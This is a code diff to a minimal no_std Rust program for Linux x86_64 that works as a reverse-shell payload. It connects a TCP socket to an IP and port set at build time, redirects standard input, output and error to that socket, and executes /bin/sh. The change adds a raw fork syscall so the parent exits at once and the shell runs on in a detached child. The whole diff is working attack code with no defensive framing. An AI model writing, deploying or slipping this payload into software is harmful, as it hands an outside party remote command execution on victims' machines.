@@ -7,6 +7,7 @@ const IP: &str = core::env!("IP");
 
 #[cfg(target_arch = "x86_64")]
 mod consts {
+    pub const SYS_FORK: usize = 57;
     pub const SYS_DUP3: usize = 292;
     pub const SYS_SOCKET: usize = 41;
     pub const SYS_CONNECT: usize = 42;
@@ -126,6 +127,7 @@ pub unsafe fn exit(ret: usize) -> ! {
     options(noreturn),
     )
 }
+
 pub fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
     let ip_it = ipv4_str.split('.');
     let mut r = [0u8; 4];
@@ -138,40 +140,70 @@ pub fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
     res |= r[3] as u32;
     res.to_be()
 }
-#[no_mangle]
-fn _start() -> ! {
-    let shell: &str = "/bin/sh\x00";
-    let argv: [*const &str; 2] = [&shell, core::ptr::null()];
-    let ip: u32 = ip_str_to_beu32(IP);
-    let socket_addr = sockaddr_in {
-        sin_family: AF_INET as u16,
-        sin_port: PORT.parse::<u16>().unwrap().to_be(),
-        sin_addr: in_addr { s_addr: ip },
-        sin_zero: [0; 8],
-    };
-    let socket_addr_len = core::mem::size_of::<sockaddr_in>();
+
+pub enum ForkResult {
+    Parent(u32), // Child's PID
+    Child,
+}
+
+pub fn fork() -> Result<ForkResult, i32> {
+    let mut result: isize;
 
     unsafe {
-        let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
-        syscall3(
-            SYS_CONNECT,
-            socket_fd,
-            &socket_addr as *const sockaddr_in as usize,
-            socket_addr_len as usize,
+        asm!(
+            "syscall",               // Use the syscall instruction
+            in("rax") SYS_FORK,        // Syscall number for fork
+            lateout("rax") result,   // Result returned in RAX
+            options(nostack, nomem), // No additional stack/memory clobbers
         );
+    }
 
-        sys_dup3(socket_fd, STDIN, 0);
-        sys_dup3(socket_fd, STDOUT, 0);
-        sys_dup3(socket_fd, STDERR, 0);
+    // Interpret the result
+    if result < 0 {
+        Err(result as i32) // Syscall returned an error
+    } else if result == 0 {
+        Ok(ForkResult::Child) // We're in the child process
+    } else {
+        Ok(ForkResult::Parent(result as u32)) // We're in the parent
+    }
+}
 
-        syscall3(
-            SYS_EXECVE,
-            shell.as_ptr() as usize,
-            argv.as_ptr() as usize,
-            0,
-        );
-        loop {}
-    };
+#[no_mangle]
+fn _start() -> ! {
+    match fork() {
+        Ok(ForkResult::Parent(child_pid)) => unsafe { exit(0) },
+        Ok(ForkResult::Child) => {
+            let shell: &str = "/bin/sh\x00";
+            let argv: [*const &str; 2] = [&shell, core::ptr::null()];
+            let ip: u32 = ip_str_to_beu32(IP);
+            let socket_addr = sockaddr_in {
+                sin_family: AF_INET as u16,
+                sin_port: PORT.parse::<u16>().unwrap().to_be(),
+                sin_addr: in_addr { s_addr: ip },
+                sin_zero: [0; 8],
+            };
+            let socket_addr_len = core::mem::size_of::<sockaddr_in>();
+            unsafe {
+                let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
+                syscall3(
+                    SYS_CONNECT,
+                    socket_fd,
+                    &socket_addr as *const sockaddr_in as usize,
+                    socket_addr_len as usize,
+                );
+                sys_dup3(socket_fd, STDIN, 0);
+                sys_dup3(socket_fd, STDOUT, 0);
+                sys_dup3(socket_fd, STDERR, 0);
+                syscall3(
+                    SYS_EXECVE,
+                    shell.as_ptr() as usize,
+                    argv.as_ptr() as usize,
+                    0,
+                );
+            };
+        }
+        Err(errno) => loop {},
+    }
 }
 #[panic_handler]
 fn panic(_: &core::panic::PanicInfo) -> ! {
